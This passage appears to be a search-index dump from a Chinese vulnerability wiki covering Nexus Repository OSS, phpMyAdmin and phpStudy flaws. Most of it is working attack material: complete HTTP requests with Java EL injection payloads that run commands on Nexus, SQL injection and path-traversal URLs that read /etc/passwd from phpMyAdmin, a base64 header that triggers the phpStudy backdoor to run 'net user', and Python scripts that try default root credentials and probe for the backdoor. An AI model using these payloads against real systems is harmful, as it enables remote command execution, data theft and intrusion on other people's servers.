{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"test\",\"version\":\"4\",\"firstName\":\"test\",\"lastName\":\"test\",\"email\":\" test@qq.com \",\"status\":\"active\",\"roles\":[\"nx-admin$\\.{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /opt/co0ontty.success')}\"]}],\"type\":\"rpc\",\"tid\":20} ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10204.png) \u547d\u4ee4\u6267\u884c\u4e8c\uff1a POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 214 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=6d9fd8c5-4b18-4680-b332-09600e9d34b5 Connection: close { \"name\": \"interna1l\", \"online\": true, \"group\": { \"memberNames\": [\"${'co0ontty'.toUpperCase()}\"] }, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true } } ``` \u89e3\u51b3\u65b9\u6848 \u00b6 \u8bf7\u5347\u7ea7\u7248\u672c\u5230 Nexus Repository Manager OSS/Pro 3.21.2 \u6216\u66f4\u9ad8\u7248\u672c \u851a\u84dd\u76fe\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u5df2\u652f\u6301\u5bf9 CVE-2020-10199 \u53ca CVE-2020-10204 \u7684\u9632\u5fa1","title":"nexus oss \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e (cve-2020-10199 && 10204)"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#nexus-repository-oss","text":"Nexus Repository OSS 3\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u4ed3\u5e93\u7ba1\u7406\u7cfb\u7edf\uff0c\u63d0\u4f9b\u4e86\u66f4\u52a0\u4e30\u5bcc\u7684\u529f\u80fd\uff0c\u800c\u4e14\u5b89\u88c5\u3001\u914d\u7f6e\u3001\u4f7f\u7528\u8d77\u6765\u4e5f\u66f4\u52a0\u7b80\u5355\u65b9\u4fbf\u3002OSS 3\u7248\u672c\u4e3b\u8981\u652f\u6301\u7684\u4ed3\u5e93\uff08Repository\uff09\u5305\u62ec\u5982\u4e0b\uff1a bower\u3001docker\u3001maven\u3001npm\u3001nuget\u3001pypi\u3001raw\u3001rubygems\u3001yum","title":"nexus repository oss"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_1","text":"10199\u7684\u6f0f\u6d1e\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\u5373\u53ef\u89e6\u53d1\uff0c\u800c10204\u5219\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\u4e24\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u539f\u56e0\u5747\u662f\u4e0d\u5b89\u5168\u7684\u6267\u884cEL\u8868\u8fbe\u5f0f\u5bfc\u81f4\u7684","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_2","text":"\u542f\u52a8\u6f0f\u6d1e\u73af\u5883 docker run -it -p 8081:8081 -d co0ontty/cve-2020-10199 \u67e5\u770b\u7528\u6237\u540d\u5bc6\u7801 \u67e5\u770b DOCKER CONTAINER ID docker ps \u67e5\u770b\u5bc6\u7801 \u5176\u4e2d bc91335e3518 \u4e3a DOCKER CONTAINER ID docker exec -it bc91335e3518 cat /root/sonatype-work/nexus3/admin.password \u8bbf\u95ee http://ip:8081","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#cve-2020-10199","text":"\u547d\u4ee4\u6267\u884c\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 372 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close {\"action\":\"cleanup_CleanupPolicy\",\"method\":\"create\",\"data\":[{\"name\":\"co0ontty\",\"format\":\"$\\.{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /opt/cve-2020-10199')}\",\"notes\":\"222\",\"mode\":\"delete\",\"lastBlobUpdatedEnabled\":false,\"lastDownloadedEnabled\":false,\"releaseTypeEnabled\":false,\"regexEnabled\":false,\"criteria\":{}}],\"type\":\"rpc\",\"tid\":33} ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10199-1.png) \u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff1a POST /service/rest/beta/repositories/apt/hosted HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 358 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close { \"name\": \"interna1l\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true, \"writePolicy\": \"allow_once\" }, \"cleanup\": { \"policyNames\": [\"co0ontty\"] }, \"apt\": { \"distribution\": \"bionic\" }, \"aptSigning\": { \"keypair\": \"string\", \"passphrase\": \"string\" } } ```","title":"cve-2020-10199"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#cve-2020-10204","text":"\u547d\u4ee4\u6267\u884c\u4e00\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 362 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close {\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"test\",\"version\":\"4\",\"firstName\":\"test\",\"lastName\":\"test\",\"email\":\" test@qq.com \",\"status\":\"active\",\"roles\":[\"nx-admin$\\.{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /opt/co0ontty.success')}\"]}],\"type\":\"rpc\",\"tid\":20} ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10204.png) \u547d\u4ee4\u6267\u884c\u4e8c\uff1a POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 214 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=6d9fd8c5-4b18-4680-b332-09600e9d34b5 Connection: close { \"name\": \"interna1l\", \"online\": true, \"group\": { \"memberNames\": [\"${'co0ontty'.toUpperCase()}\"] }, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true } } ```","title":"cve-2020-10204"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_3","text":"\u8bf7\u5347\u7ea7\u7248\u672c\u5230 Nexus Repository Manager OSS/Pro 3.21.2 \u6216\u66f4\u9ad8\u7248\u672c \u851a\u84dd\u76fe\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u5df2\u652f\u6301\u5bf9 CVE-2020-10199 \u53ca CVE-2020-10204 \u7684\u9632\u5fa1","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 phpMyAdmin 4 < 4.9.4 phpMyAdmin 5 < 5.0.1 \u5df2\u77e5\u4e00\u4e2a\u7528\u6237\u540d\u5bc6\u7801 \u6f0f\u6d1e\u5229\u7528 \u00b6 \u6ce8\u5165\u70b9\u4e3ausername\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u8bed\u53e5\u683c\u5f0f\u5982\u4e0b http://**********/server_privileges.php?ajax_request=true&validate_username=1&username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&token=c2064a8c5f437da931fa01de5aec6581&viewing_mode=server","title":"phpMyAdmin SQL\u6ce8\u5165(CVE-2020-0554)"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/#_1","text":"phpMyAdmin 4 < 4.9.4 phpMyAdmin 5 < 5.0.1 \u5df2\u77e5\u4e00\u4e2a\u7528\u6237\u540d\u5bc6\u7801","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/#_2","text":"\u6ce8\u5165\u70b9\u4e3ausername\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u8bed\u53e5\u683c\u5f0f\u5982\u4e0b http://**********/server_privileges.php?ajax_request=true&validate_username=1&username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&token=c2064a8c5f437da931fa01de5aec6581&viewing_mode=server","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 phpMyAdmin 4.8.0-4.8.1 \u6f0f\u6d1ePOC \u00b6 http://**********/index?target=db_sql.php%253f/../../../../../../../../etc/passwd","title":"phpMyAdmin\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#_1","text":"phpMyAdmin 4.8.0-4.8.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#poc","text":"http://**********/index?target=db_sql.php%253f/../../../../../../../../etc/passwd","title":"\u6f0f\u6d1ePOC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/","text":"\u6f0f\u6d1e\u7f16\u53f7 \u00b6 CVE-2018-12613 \u5f71\u54cd\u7248\u672c \u00b6 phpMyAdmin 4.8.0\u548c4.8.1\u53d7\u5230\u5f71\u54cd\u3002 \u5229\u7528 \u00b6 http://ip:8080/phpMyAdmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd \u66f4\u591a \u00b6 https://blog.csdn.net/qq_33020901/article/details/80829269","title":"phpmyadmin\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6CVE 2018 12613"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/#_1","text":"CVE-2018-12613","title":"\u6f0f\u6d1e\u7f16\u53f7"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/#_2","text":"phpMyAdmin 4.8.0\u548c4.8.1\u53d7\u5230\u5f71\u54cd\u3002","title":"\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/#_3","text":"http://ip:8080/phpMyAdmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd","title":"\u5229\u7528"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/#_4","text":"https://blog.csdn.net/qq_33020901/article/details/80829269","title":"\u66f4\u591a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5f71\u54cd\u7248\u672c\uff1aphpstudy <= 8.1.0.7 phpstudy \u5b58\u5728 nginx \u89e3\u6790\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5229\u7528\u4e0a\u4f20\u529f\u80fd\uff0c\u5c06\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684\u5408\u6cd5\u6587\u4ef6\u7c7b\u578b\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5f71\u54cd\u3002 \u73af\u5883\u642d\u5efa \u00b6 \u4e0b\u8f7dphpstudy v8.1.0.7\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\u5982\u4e0b\uff1a \u00b6 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6b63\u5e38\u8bbf\u95ee\u56fe\u7247\uff1a \u00b6 http://192.168.3.142:8088/123.gif \u589e\u52a0\u540e\u7f00\u8bbf\u95ee\u5982\u4e0b\uff1a \u00b6 \u6210\u529f\u89e3\u6790php\u6587\u4ef6 http://192.168.3.142:8088/123.gif/xxx.php \u6f0f\u6d1e\u5206\u6790 \u00b6 \u8be5\u6f0f\u6d1e\u5c5e\u4e8e\u5b89\u5168\u914d\u7f6e\u9519\u8bef\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u4e3a\uff1a 1\u3001\u7531\u4e8e\u914d\u7f6e\u9519\u8bef\uff0c\u5bfc\u81f4 nginx \u628a\u4ee5 .php \u7ed3\u5c3e\u7684\u6587\u4ef6\u4ea4\u7ed9 fastcgi \u5904\u7406\uff0c\u56e0\u6b64\u53ef\u4ee5\u6784\u9020 http://192.168.3.142:8088/123.gif/xxx.php\uff08\u4efb\u4f55\u670d\u52a1\u5668\u7aef\u4e0d\u5b58\u5728\u7684php\u6587\u4ef6\u5747\u53ef\uff0c\u6bd4\u5982X.php\uff09 2\u3001\u4f46\u662f fastcgi \u5728\u5904\u7406 xxx.php \u6587\u4ef6\u65f6\u53d1\u73b0\u6587\u4ef6\u5e76\u4e0d\u5b58\u5728\uff0c\u8fd9\u65f6 php.ini \u914d\u7f6e\u6587\u4ef6\u4e2d cgi.fix_pathinfo=1 \u53d1\u6325\u4f5c\u7528\uff0c\u8fd9\u9879\u914d\u7f6e\u7528\u4e8e\u4fee\u590d\u8def\u5f84\uff0c\u5982\u679c\u5f53\u524d\u8def\u5f84\u4e0d\u5b58\u5728\u5219\u91c7\u7528\u4e0a\u5c42\u8def\u5f84\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea4\u7531 fastcgi \u5904\u7406\u7684\u6587\u4ef6\u5c31\u53d8\u6210\u4e86 /123.gif. 3\u3001\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f php-fpm.conf \u4e2d\u7684 security.limit_extensions \u914d\u7f6e\u9879\u9650\u5236\u4e86 fastcgi \u89e3\u6790\u6587\u4ef6\u7684\u7c7b\u578b\uff08\u5373\u6307\u5b9a\u4ec0\u4e48\u7c7b\u578b\u7684\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790\uff09\uff0c\u6b64\u9879\u8bbe\u7f6e\u4e3a\u7a7a\u7684\u65f6\u5019\u624d\u5141\u8bb8 fastcgi \u5c06 .png \u7b49\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790. \u200b \u5206\u7c7b: Web\u5b89\u5168","title":"phpStudy nginx \u89e3\u6790\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_1","text":"\u5f71\u54cd\u7248\u672c\uff1aphpstudy <= 8.1.0.7 phpstudy \u5b58\u5728 nginx \u89e3\u6790\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5229\u7528\u4e0a\u4f20\u529f\u80fd\uff0c\u5c06\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684\u5408\u6cd5\u6587\u4ef6\u7c7b\u578b\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5f71\u54cd\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_2","text":"","title":"\u73af\u5883\u642d\u5efa"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#phpstudy-v8107","text":"","title":"\u4e0b\u8f7dphpstudy v8.1.0.7\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_3","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_4","text":"http://192.168.3.142:8088/123.gif","title":"\u6b63\u5e38\u8bbf\u95ee\u56fe\u7247\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_5","text":"\u6210\u529f\u89e3\u6790php\u6587\u4ef6 http://192.168.3.142:8088/123.gif/xxx.php","title":"\u589e\u52a0\u540e\u7f00\u8bbf\u95ee\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_6","text":"\u8be5\u6f0f\u6d1e\u5c5e\u4e8e\u5b89\u5168\u914d\u7f6e\u9519\u8bef\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u4e3a\uff1a 1\u3001\u7531\u4e8e\u914d\u7f6e\u9519\u8bef\uff0c\u5bfc\u81f4 nginx \u628a\u4ee5 .php \u7ed3\u5c3e\u7684\u6587\u4ef6\u4ea4\u7ed9 fastcgi \u5904\u7406\uff0c\u56e0\u6b64\u53ef\u4ee5\u6784\u9020 http://192.168.3.142:8088/123.gif/xxx.php\uff08\u4efb\u4f55\u670d\u52a1\u5668\u7aef\u4e0d\u5b58\u5728\u7684php\u6587\u4ef6\u5747\u53ef\uff0c\u6bd4\u5982X.php\uff09 2\u3001\u4f46\u662f fastcgi \u5728\u5904\u7406 xxx.php \u6587\u4ef6\u65f6\u53d1\u73b0\u6587\u4ef6\u5e76\u4e0d\u5b58\u5728\uff0c\u8fd9\u65f6 php.ini \u914d\u7f6e\u6587\u4ef6\u4e2d cgi.fix_pathinfo=1 \u53d1\u6325\u4f5c\u7528\uff0c\u8fd9\u9879\u914d\u7f6e\u7528\u4e8e\u4fee\u590d\u8def\u5f84\uff0c\u5982\u679c\u5f53\u524d\u8def\u5f84\u4e0d\u5b58\u5728\u5219\u91c7\u7528\u4e0a\u5c42\u8def\u5f84\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea4\u7531 fastcgi \u5904\u7406\u7684\u6587\u4ef6\u5c31\u53d8\u6210\u4e86 /123.gif. 3\u3001\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f php-fpm.conf \u4e2d\u7684 security.limit_extensions \u914d\u7f6e\u9879\u9650\u5236\u4e86 fastcgi \u89e3\u6790\u6587\u4ef6\u7684\u7c7b\u578b\uff08\u5373\u6307\u5b9a\u4ec0\u4e48\u7c7b\u578b\u7684\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790\uff09\uff0c\u6b64\u9879\u8bbe\u7f6e\u4e3a\u7a7a\u7684\u65f6\u5019\u624d\u5141\u8bb8 fastcgi \u5c06 .png \u7b49\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790. \u200b \u5206\u7c7b: Web\u5b89\u5168","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpmyadmin_defaultpwd/","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- ''' name: phpstudy phpmyadmin\u9ed8\u8ba4\u5bc6\u7801\u6f0f\u6d1e referer: wooyun-2015-094933 author: Lucifer description: phpstudy\u7684\u9ed8\u8ba4phpmyadmin\u540e\u53f0\u5b58\u5728\u9ed8\u8ba4\u7528\u6237\u540d\u5bc6\u7801\u53ef\u5199shell\u3002 ''' import sys import json import requests import warnings def run(url): result = ['phpstudy phpmyadmin\u9ed8\u8ba4\u5bc6\u7801\u6f0f\u6d1e','',''] headers = { \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"application/x-www-form-urlencoded\", } payload = \"/phpmyadmin/index.php\" vulnurl = url + payload post_data = { \"pma_username\":\"root\", \"pma_password\":\"root\", \"server\":\"1\", \"target\":\"index.php\" } try: sess = requests.Session() req = sess.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False) req2 = sess.get(vulnurl, headers=headers, timeout=10, verify=False) if r\"navigation.php\" in req2.text and r\"frame_navigation\" in req.text: result[2]= '\u5b58\u5728' result[1] = vulnurl+\"\\tpost: \"+json.dumps(post_data, indent=4) else: result[2]= '\u4e0d\u5b58\u5728' except: result[2]='\u4e0d\u5b58\u5728' return result if __name__ == \"__main__\": warnings.filterwarnings(\"ignore\") testVuln = run(sys.argv[1])","title":"Phpmyadmin defaultpwd"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy_backdoor/","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- ''' name: phpstudy\u540e\u95e8 referer: unknown author: qianxiao996 description: phpstudy\u540e\u95e8\u63a2\u6d4b ''' import sys import requests import warnings import base64 def run(url): result = ['phpstudy\u540e\u95e8', '', ''] payload = \"echo \\\"testdoor\\\";\" payload = base64.b64encode(payload.encode('utf-8')) payload = str(payload, 'utf-8') headers = { 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'accept-charset': payload, 'Accept-Encoding': 'gzip,deflate', 'Connection': 'close', } try: req = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=30) if \"testdoor\" in req.text: result[2]= '\u5b58\u5728' else: result[2]= '\u4e0d\u5b58\u5728' except: result[2]= '\u4e0d\u5b58\u5728' # print(result) return result if __name__ == \"__main__\": warnings.filterwarnings(\"ignore\") testVuln = run(sys.argv[1])","title":"Phpstudy backdoor"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E5%90%8E%E9%97%A8/","text":"\u6f0f\u6d1e\u7248\u672c \u00b6 phpstudy\u540e\u95e8 \u5f71\u54cd\u7248\u672c \u00b6 phpstudy 2016\u7248php-5.4 phpstudy 2018\u7248php-5.2.17 phpstudy 2018\u7248php-5.4.45 \u5229\u7528 \u00b6 \u6d4f\u89c8\u4e3b\u9875\u6293\u5305 \u53bb\u6389Accept-Encoding:gzip, defate\u9017\u53f7\u540e\u9762\u7684\u7a7a\u683c\u53bb\u6389\uff0c\u5426\u5219\u547d\u4ee4\u6267\u884c\u4f1a\u5931\u8d25 \u5728\u8bf7\u6c42\u5934\u6dfb\u52a0 accept-charset:ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 \u5bc6\u6587\u5185\u5bb9\u4e3a echo system('net user');","title":"Phpstudy\u540e\u95e8"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E5%90%8E%E9%97%A8/#_1","text":"phpstudy\u540e\u95e8","title":"\u6f0f\u6d1e\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E5%90%8E%E9%97%A8/#_2","text":"phpstudy 2016\u7248php-5.4 phpstudy 2018\u7248php-5.2.17 phpstudy 2018\u7248php-5.4.45","title":"\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E5%90%8E%E9%97%A8/#_3","text":"\u6d4f\u89c8\u4e3b\u9875\u6293\u5305 \u53bb\u6389Accept-Encoding:gzip, defate\u9017\u53f7\u540e\u9762\u7684\u7a7a\u683c\u53bb\u6389\uff0c\u5426\u5219\u547d\u4ee4\u6267\u884c\u4f1a\u5931\u8d25 